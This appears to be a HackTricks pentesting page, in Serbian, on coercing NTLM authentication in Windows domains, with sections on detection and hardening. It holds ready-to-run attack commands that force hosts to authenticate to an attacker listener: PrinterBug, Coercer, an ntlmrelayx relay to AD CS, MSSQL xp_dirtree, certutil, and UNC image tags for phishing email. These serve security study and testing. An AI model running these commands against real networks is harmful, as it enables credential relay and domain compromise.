# Iznuđivanje privilegovane NTLM autentifikacije

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za udaljenu autentifikaciju**, napisanih u C# pomoću MIDL compiler-a radi izbegavanja zavisnosti od third-party komponenti.

## Zloupotreba usluge Spooler

Ako je usluga _**Print Spooler**_ **omogućena,** možete da upotrebite neke već poznate AD akreditive da **zatražite** od print servera Domain Controller-a **ažuriranje** o novim poslovima štampanja i samo mu kažete da **pošalje obaveštenje nekom sistemu**.\
Imajte na umu da kada printer šalje obaveštenje proizvoljnim sistemima, mora da se **autentifikuje na tom** **sistemu**. Zato napadač može da natera uslugu _**Print Spooler**_ da se autentifikuje na proizvoljnom sistemu, a usluga će u toj autentifikaciji **koristiti račun računara**.

U pozadini, klasični primitiv **PrinterBug** zloupotrebljava **`RpcRemoteFindFirstPrinterChangeNotificationEx`** preko **`\\PIPE\\spoolss`**. Napadač prvo otvara handle ka printeru/serveru, a zatim prosleđuje lažno ime klijenta u `pszLocalMachine`, zbog čega ciljni spooler uspostavlja kanal za obaveštenja **ka hostu pod kontrolom napadača**. Zato je efekat **iznuđivanje odlazne autentifikacije**, a ne direktno izvršavanje koda.<sup>[[2]](#references)</sup>\
Ako tražite **RCE/LPE** u samom spooler-u, pogledajte [PrintNightmare](printnightmare.md). Ova stranica se bavi **iznuđivanjem autentifikacije i relay-om**.

### Pronalaženje Windows servera u domenu

Koristite PowerShell za navođenje Windows hostova. Serveri su obično mete najvišeg prioriteta, zato se prvo usredsredite na njih:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Pronalaženje Spooler servisa koji osluškuju

Pomoću neznatno izmenjenog alata [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autora @mysmartlogin-a (Vincenta Le Touxa), proverite da li Spooler Service osluškuje:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Možete koristiti i `rpcdump.py` na Linux-u i potražiti protokol **MS-RPRN**:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Ili brzo testirajte hostove sa Linuxa pomoću **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Ako želite da **nabrojite površine za prinudno pokretanje autentikacije** umesto da samo proverite da li spooler endpoint postoji, koristite **Coercer scan mode**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Ovo je korisno jer to što vidite endpoint u EPM-u samo znači da je print RPC interfejs registrovan. To **ne** garantuje da su sve metode prinude dostupne sa vašim trenutnim privilegijama niti da će host pokrenuti upotrebljiv tok autentifikacije.

### Zatražite od servisa da se autentifikuje na proizvoljnom hostu

Možete da kompajlirate [SpoolSample iz originalnog repozitorijuma](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

ili upotrebite [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ili [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ako koristite Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Pomoću alata **Coercer** možete direktno ciljati interfejse spooler servisa i izbeći nagađanje o tome koja je RPC metoda izložena:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Moderni RPC-over-TCP callback-ovi

Nemojte pretpostaviti da uspešan poziv `RpcRemoteFindFirstPrinterChangeNotificationEx` mora da generiše saobraćaj na TCP/445. **Windows 11 22H2 i novije verzije podrazumevano koriste RPC over TCP za komunikaciju sa štampačima**; RPC over named pipes je onemogućen, osim ako ga politika ili `RpcUseNamedPipeProtocol=1` ponovo ne omogući. Zato legacy SMB-only listener-i mogu da prijave da je trigger poslat, a da nikada ne prime callback. Microsoft dokumentuje TCP/135 (Endpoint Mapper) i dinamičke RPC portove za uobičajeni RPC sa štampačima, a organizacije mogu da ograniče ovaj opseg ili izaberu fiksni RPC port za štampače.<sup>[[10]](#references)</sup>

Aktuelni **Impacket `ntlmrelayx.py`** uključuje RPC relay server i mali Endpoint Mapper, koji su podrazumevano omogućeni na TCP/135. Ova podrška je dodata u junu 2025. godine, uz demonstrirani PrinterBug-to-AD-CS lanac, što omogućava relay autentifikovanog RPC callback-a čak i kada žrtva ne pređe na SMB/WebDAV.<sup>[[11]](#references)</sup>

Podrška za RPC relay/EPM uključena je u **Impacket 0.13.0 i novije verzije**. Pre nego što počnete da otklanjate problem sa listener-om koji nedostaje na TCP/135, proverite da li se izvršava starija paketirana verzija `ntlmrelayx.py`; izlaz pomoći treba da prikazuje oba RPC-server prekidača.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Potražite `Setting up RPC Server on port 135` i `RPCD: Received connection` u izlazu relay-a. Ako RPC poziv vrati očekivanu grešku, ali ništa ne stigne do listener-a, proverite print RPC transport policy na žrtvi, outbound filtering, DNS rezoluciju i da li neki drugi proces već koristi TCP/135. Takođe proverite da `ntlmrelayx` nije pokrenut sa opcijom `--no-rpc-server`.

### Forsiranje HTTP-a umesto SMB-a pomoću WebClient-a

Na sistemima koji i dalje koriste **RPC over named pipes** (legacy verzije ili ponašanje vraćeno pravilima), klasični PrinterBug obično izaziva **SMB** autentifikaciju ka `\\attacker\share`, što je i dalje korisno za **capture**, **relay ka HTTP ciljevima** ili **relay u slučajevima kada SMB signing nije prisutan**.\
Međutim, relay sa **SMB na SMB** često blokira **SMB signing**, pa operateri mogu radije da forsiraju **HTTP/WebDAV** autentifikaciju. Ovo nije rezervna opcija za gore opisano ponašanje RPC-over-TCP.

Ako je na cilju pokrenut servis **WebClient**, listener može da se navede u obliku koji će naterati Windows da koristi **WebDAV over HTTP**:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Ovo je naročito korisno kada se kombinuje sa **`ntlmrelayx --adcs`** ili drugim HTTP relay odredištima, jer se tako izbegava oslanjanje na mogućnost SMB relay-a preko nametnute konekcije. Važno ograničenje je da **WebClient mora biti pokrenut** na žrtvi da bi HTTP/WebDAV varijanta funkcionisala.

### Kombinovanje sa Unconstrained Delegation

Ako je napadač kompromitovao računar konfigurisan za [Unconstrained Delegation](unconstrained-delegation.md), može **naterati štampač da se autentifikuje na tom računaru**. **TGT** naloga računara štampača zatim se kešira u memoriji na hostu sa unconstrained delegation-om, gde napadač može da ga preuzme i ponovo upotrebi pomoću [Pass the Ticket](pass-the-ticket.md).

### Napomene o detekciji i hardening-u

Najpouzdaniji način da se ukloni PrinterBug sa DC-ja, PAW-a ili servera koji ne štampa jeste da se Spooler zaustavi i onemogući. Tamo gde je štampanje neophodno, ojačajte svako moguće relay odredište (SMB server signing, LDAP signing/channel binding i EPA na HTTP servisima kao što je AD CS), umesto da pretpostavite da je blokiranje TCP/445 na putanji povratne konekcije dovoljno.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Ako hostu i dalje treba **lokalno štampanje**, uža kontrola je GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Time se sprečava spooler da prihvata veze udaljenih klijenata (i deljenje štampača), dok usluga ostaje dostupna lokalno; nakon primene ponovo pokrenite spooler, a zatim ponovite gorenavedene provere dostupnosti MS-RPRN.<sup>[[13]](#references)</sup>

Detekcija treba da koreliše autentifikovani poziv ka MS-RPRN UUID-u `12345678-1234-abcd-ef00-0123456789ab`, naročito opnum 62/65 sa vrednošću callback-a koja nije lokalna, i neposrednu odlaznu SMB, HTTP ili RPC vezu sa hosta spooler-a. Uspostavite osnovni profil prema **interface UUID/opnum i parovima izvora i odredišta**, a ne samo prema pristupu `\PIPE\spoolss`, jer aktuelni print stack-ovi mogu da uspostave callback preko RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC prisilna autentifikacija

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matrica prisiljavanja preko RPC UNC putanja (interfejsi/opnum-ovi koji pokreću odlaznu autentifikaciju)
- MS-RPRN (Print System Remote Protocol)
  - Cev: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnum-ovi: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Alati: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Cev: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Napomene: asinhroni print interfejs na istoj spooler cevi; koristite Coercer da nabrojite dostupne metode na datom hostu<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Cevi: \\PIPE\\efsrpc (takođe preko \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUID-ovi: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Opnum-ovi koji se često zloupotrebljavaju: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Alat: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Cev: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnum-ovi: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Alat: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Cev: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnum-ovi: 8 IsPathSupported; 9 IsPathShadowCopied
  - Alat: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Cev: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Alat: CheeseOunce<sup>[[1]](#references)</sup>

Napomena: Ove metode prihvataju parametre koji mogu da sadrže UNC putanju (npr. `\\attacker\share`). Kada se obradi, Windows će se autentifikovati na toj UNC putanji u kontekstu računara/korisnika, što omogućava hvatanje ili relaying NetNTLM autentifikacije.\
Za zloupotrebu spooler-a, **MS-RPRN opnum 65** i dalje je najčešće korišćen i najbolje dokumentovan primitive, jer specifikacija protokola izričito navodi da server kreira kanal za obaveštenja nazad ka klijentu navedenom u `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: prisiljavanje pomoću ElfrOpenBELW (opnum 9)
- Interfejs: MS-EVEN preko \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Potpis poziva: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Efekat: cilj pokušava da otvori navedenu putanju rezervne kopije evidencije i autentifikuje se na UNC putanji koju kontroliše napadač.<sup>[[1]](#references)</sup>
- Praktična primena: prisilite Tier 0 resurse (DC/RODC/Citrix/itd.) da emituju NetNTLM, a zatim izvršite relay ka AD CS krajnjim tačkama (scenariji ESC8/ESC11) ili drugim privilegovanim servisima.<sup>[[1]](#references)</sup>

## PrivExchange

Napad `PrivExchange` rezultat je propusta u funkcionalnosti **Exchange Server `PushSubscription`**. Ova funkcionalnost omogućava da bilo koji korisnik domena koji ima poštansko sanduče prisili Exchange server da se autentifikuje na bilo kom hostu koji navede klijent, preko HTTP-a.

Exchange servis podrazumevano radi kao **SYSTEM** i ima prekomerne privilegije (konkretno, ima **WriteDacl privilegije u domenu pre Cumulative Update-a za 2019. godinu**). Ovaj propust može da se iskoristi za **prosleđivanje informacija ka LDAP-u i zatim izdvajanje NTDS baze podataka domena**. Ako prosleđivanje ka LDAP-u nije moguće, ovaj propust se i dalje može iskoristiti za relay i autentifikaciju na drugim hostovima u domenu. Uspešna eksploatacija ovog napada omogućava neposredan pristup nalogu Domain Admin korišćenjem bilo kog autentifikovanog korisničkog naloga domena.

## Unutar Windows-a

Ako ste već unutar Windows mašine, možete da prisilite Windows da se poveže sa serverom koristeći privilegovane naloge pomoću:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Ili upotrebite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je upotrebiti lolbin certutil.exe (binarni fajl koji je potpisao Microsoft) da biste prinudili NTLM autentifikaciju:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Putem emaila

Ako znate **email adresu** korisnika koji se prijavljuje na mašinu koju želite da kompromitujete, možete mu jednostavno poslati **email sa slikom dimenzija 1x1**, kao što je

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Kada je žrtva otvori, Windows pokušava da se autentifikuje.

### MitM

Ako možete da izvedete MitM napad i ubacite HTML u stranicu koju žrtva pregleda, pokušajte da ubacite sliku poput ove:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Drugi načini za izazivanje NTLM autentifikacije i phishing


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Kreking NTLMv1

Ako možete da uhvatite [NTLMv1 izazove, ovde pročitajte kako da ih kreknete](../ntlm/index.html#ntlmv1-attack).\
_Zapamtite da za kreking NTLMv1 morate da podesite Responder challenge na "1122334455667788"_



## References

- [1] [Unit 42 – Prinudna autentifikacija se stalno razvija](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protokol za udaljeni pristup EventLog-u](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Ažuriranja RPC veze za štampanje u Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC relay server i Endpoint Mapper za ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 izdanje](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Dozvoli usluzi Print Spooler da prihvata klijentske veze](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
